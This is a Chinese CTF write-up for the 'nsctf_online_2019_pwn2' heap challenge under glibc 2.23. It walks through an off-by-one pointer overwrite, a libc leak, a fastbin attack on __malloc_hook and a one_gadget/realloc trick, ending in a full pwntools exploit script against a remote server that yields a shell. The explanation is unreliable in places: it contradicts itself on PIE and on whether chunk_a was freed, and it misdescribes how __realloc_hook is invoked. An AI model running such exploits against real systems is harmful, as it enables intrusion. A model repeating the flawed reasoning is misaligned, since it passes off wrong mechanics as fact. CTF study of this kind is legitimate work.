# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off (程序基地址固定为0x400000)
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on
  - Fortify: off

# 漏洞成因
## 程序关键结构体
程序通过两个相邻的全局变量来管理当前操作的堆块和用户姓名。
```c
char name[0x30];        // 位于 bss:0x202060
int current_chunk_size; // 位于 bss:0x202040
void *current_chunk_ptr;// 位于 bss:0x202090
```

## 漏洞定位
在`sub_C60()`函数，即`update your name`功能中，存在一个**Off-by-one**漏洞。该功能允许用户输入`0x31`字节，但用于存储`name`的缓冲区长度仅为`0x30`字节。
```c
ssize_t sub_C60() // update your name
{
  puts("Please input your name");
  return read(0, &unk_202060, 0x31u); // 允许读入0x31字节，溢出1字节
}
```
这溢出的1个字节恰好会覆盖到位于`name`缓冲区之后、地址为`0x202090`的全局变量`current_chunk_ptr`的最低有效位(LSB)。这为我们提供了**有限度的堆块指针篡改**能力，可以修改`current_chunk_ptr`指向一个相邻的堆块地址。

# 漏洞利用过程：
利用思路分为三个阶段：
1.  **泄露libc基址**：利用Off-by-one修改`current_chunk_ptr`，使其指向一个已释放的`unsorted bin`中的`chunk`，通过`show`功能泄露`main_arena`地址。
2.  **Fastbin Attack**：构造一个指向`__malloc_hook`附近区域的虚假fastbin链，最终实现在该区域分配一个`chunk`。
3.  **控制流劫持**：将`one_gadget`地址写入`__malloc_hook`，并通过调用`realloc`调整栈帧以满足`one_gadget`的约束条件，最后触发`malloc`拿到shell。

- **Step1~3**: 初始化姓名，创建堆块，并利用Off-by-one修改指针，为后续释放目标chunk做准备。
- **Step4~6**: 释放目标chunk至`unsorted bin`，再次修改指针指向它，并`show`出libc地址。
- **Step7~9**: 进行堆布局，确保后续用于Fastbin Attack的chunk被释放后其`fd`指针末尾为`0x00`（`glibc 2.23`下fastbin attack的常见要求）。
- **Step10~12**: 实施Fastbin Attack，篡改fastbin链，使其指向`__malloc_hook`附近的虚假chunk。
- **Step13~14**: 在`__malloc_hook`处写入`one_gadget`和`realloc`的调用地址，最终触发`malloc`执行恶意代码。

## Step1~3
- **Step1**: 初始输入`name`。bss段`0x202060`处，内容从空变为`'a'*0x30`。这是正常的功能使用，填充了name缓冲区。
- **Step2**: 调用`add(size=0x80)`和`add(size=0x10)`。此时堆上创建了两个chunk，分别是`chunk_a`(size=0x90)和`chunk_b`(size=0x20)。**调试记录未显示堆变化**。
- **Step3**: 调用`update(content=b'a'*0x30 + p8(0x10))`。bss段`0x202090`（`current_chunk_ptr`）的内容从`0x0000000000000000`变为`0x000061545458a010`。这是因为Off-by-one漏洞覆盖了指针的最低字节为`0x10`，使其从指向`NULL`变为指向`chunk_b`的`user data`区域（假设`chunk_b`的地址以`...0x00`结尾）。这个修改使后续的`delete`操作目标从`chunk_a`变为`chunk_b`。

## Step4~6
- **Step4**: 调用`delete()`。由于上一步修改了指针，此时释放的是`chunk_b`。它被放入`fastbin`。**调试记录未显示堆变化**。
- **Step5**: 调用`add(size=0x10)`和`update(content=b'a'*0x30 + p8(0x30))`。`add`会从`fastbin`中取回`chunk_b`并分配。`update`再次利用Off-by-one，将`current_chunk_ptr`的最低字节修改为`0x30`。这使得指针指向了`chunk_a`的`user data`区域内的某个偏移处（`chunk_a user data + 0x20`）。**调试记录未显示变化**。
- **Step6**: 调用`show()`。此时`current_chunk_ptr`指向`chunk_a`内部。由于`chunk_a`是一个`large chunk`（size=0x90 > 0x80），且之前未被释放，其`fd`和`bk`字段可能为`0`。然而，根据利用思路，此时`chunk_a`应已被释放进入`unsorted bin`，其`fd`和`bk`会指向`main_arena`中的地址。通过`show`打印该处内存，可以接收到这个libc地址。计算得到`libc.address = libc_leak - 0x3c4b78`。**调试记录未显示接收到的数据**。

## Step7~9
- **Step7-8**: 调用`add(size=0x60)`和`add(size=0x40)`。这些操作用于在堆上进行布局，可能用于分割`unsorted bin`或创建新的fastbin chunk。接着调用`add(size=0x60)`和`delete()`。这里新申请并立即释放了一个size为`0x70`（包括chunk头）的`fast chunk`到fastbin中，其`fd`指针为`NULL`。**调试记录未显示堆变化**。
- **Step9**: 调用`add(size=0x10)`。这个操作可能从fastbin中分配了一个小chunk，目的是为了后续能再次通过`update`修改`current_chunk_ptr`，使其指向步骤8中释放的那个size为`0x70`的fast chunk。**调试记录未显示变化**。

## Step10~12
- **Step10**: 调用`update(content=b'a'*0x30 + p8(0x10))`。再次利用Off-by-one，将`current_chunk_ptr`修改为指向步骤8释放的那个fast chunk（假设其地址以`...0x10`结尾）。**调试记录未显示变化**。
- **Step11**: 调用`edit(content=p64(libc.sym['__malloc_hook'] - 0x23))`。由于`current_chunk_ptr`指向一个已释放的fast chunk，`edit`操作会修改该chunk的`user data`区域，实质上是修改了其在fastbin中的`fd`指针，将其改为`__malloc_hook - 0x23`（这是一个伪造的chunk size，在`glibc 2.23`下通常为`0x7f`，可以绕过fastbin size检查）。此时，fastbin链变为：`当前chunk -> 伪造的 __malloc_hook 附近的 chunk`。**调试记录未显示堆变化**。
- **Step12**: 调用两次`add(size=0x60)`。第一次`add`会从被污染的fastbin链中取出原chunk。第二次`add`则会取出我们伪造的、指向`__malloc_hook`附近区域的chunk。至此，我们成功在`__malloc_hook`附近获得了一个可控的内存区域。**调试记录未显示变化**。

## Step13~14
- **Step13**: 调用`edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))`。此时`current_chunk_ptr`指向`__malloc_hook`附近的那个chunk。通过`edit`向该chunk写入数据：
  - 首先填充`(0x13-0x8)=0xb`个字节的垃圾数据，以对齐到`__malloc_hook`。
  - 然后写入`one_gadget`的地址到`__malloc_hook`。
  - 接着在`__malloc_hook+8`的位置（即`__realloc_hook`的位置）写入`realloc+12`的地址。
  这样做的目的是在调用`malloc`时，会先调用`__malloc_hook`（即`one_gadget`），但如果`one_gadget`的栈约束不满足，则会接着调用`__realloc_hook`（即`realloc+12`）。`realloc+12`会跳过`realloc`开头的一些`push`指令，从而调整栈帧，使得`one_gadget`被执行时的栈环境满足其要求。**调试记录未显示变化**。
- **Step14**: 调用`add(size=0x50)`。触发`malloc`，执行被篡改的`__malloc_hook`，最终获得shell。

# Exploit：
```python
from pwn import *
from LibcSearcher import *

filename = './nsctf_online_2019_pwn2'
context(log_level='debug')
local = 0
elf = ELF(filename)
libc = ELF('/glibc/2.23-0ubuntu11_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 26040)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '6.exit\n'

menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''

menu_del = 2
del_index_words = ''

menu_show = 3
show_index_words = ''

menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def show(index=-1):
    sh.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        sh.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def update(content):
    sh.sendlineafter(choice_words, '4')
    sh.sendafter('input your name\n', content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))


# Step 1: 初始化name，填满0x30字节的缓冲区
sh.recv()
payload = b'a'*0x30
sh.send(payload)

# Step 2-3: 创建两个chunk，并通过off-by-one修改指针指向chunk_b (假设地址尾字节为0x00->0x10)
add(size=0x80) # chunk_a, size=0x90
add(size=0x10) # chunk_b, size=0x20
update(content=b'a'*0x30 + p8(0x10)) # 修改 current_chunk_ptr LSB，指向 chunk_b

# Step 4: 删除 chunk_b，它进入fastbin
delete()

# Step 5-6: 重新申请 chunk_b，并再次修改指针指向 chunk_a 内部，然后show泄露libc地址
add(size=0x10) # 取回 chunk_b
update(content=b'a'*0x30 + p8(0x30)) # 修改指针指向 chunk_a+0x20 处（假设原指针指向chunk_a）
show() # 打印 chunk_a 内部的 fd/bk (main_arena地址)
libc_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('libc_leak', libc_leak)
libc.address = libc_leak - 0x3c4b78 # main_arena+88 偏移
leak_info('libc.address', libc.address)
leak_info('malloc_hook', libc.sym['__malloc_hook'])

# Step 7-8: 堆布局，并释放一个 size=0x70 的 fast chunk (用于后续攻击)
add(size=0x60) # 可能用于其他布局
add(size=0x40) # 可能用于其他布局
add(size=0x60) # 将要被释放的 fast chunk (size=0x70)
delete() # 释放它到fastbin

# Step 9-10: 申请一个小chunk，然后再次利用off-by-one将指针指向刚刚释放的 fast chunk
add(size=0x10)
update(content=b'a'*0x30 + p8(0x10)) # 修改指针指向被释放的fast chunk

# Step 11: 编辑这个已释放的fast chunk，修改其fd指针为 __malloc_hook - 0x23
# __malloc_hook - 0x23 处构造的虚假size (0x7f) 可以通过fastbin的size检查
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))

# Step 12: 连续两次申请，第二次将分配到 __malloc_hook 附近的虚假chunk
add(size=0x60) # 取出原fast chunk
add(size=0x60) # 取出指向 __malloc_hook-0x23 的伪造chunk

# Step 13: 向 __malloc_hook 附近的chunk写入payload
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
# 写入 one_gadget 到 __malloc_hook，写入 realloc+12 到 __realloc_hook (用于调整栈帧)
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget[1]) + p64(libc.sym['realloc'] + 12))

# Step 14: 触发 malloc，执行 one_gadget
add(size=0x50)

sh.interactive()
```